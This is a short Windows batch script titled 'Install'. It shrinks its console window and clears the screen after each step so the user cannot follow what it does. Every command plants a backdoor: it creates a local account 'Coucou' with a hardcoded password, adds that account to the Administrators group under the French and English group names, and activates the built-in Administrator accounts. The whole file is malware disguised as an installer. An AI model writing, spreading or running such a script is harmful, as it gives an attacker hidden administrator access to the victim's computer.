@echo off
title Install
mode con: cols=15 lines=1
cls
net user Coucou /add
cls
net localgroup Administrateurs Coucou /add
cls
net localgroup Administrators Coucou /add
cls
net localgroup WDAGUtilityAccount Coucou /add
cls
net user Coucou CoucouWas-here
cls
net user Coucou /active:yes
cls
net user Administrateur /active:yes
cls
net user Administrator /active:yes
cls
exit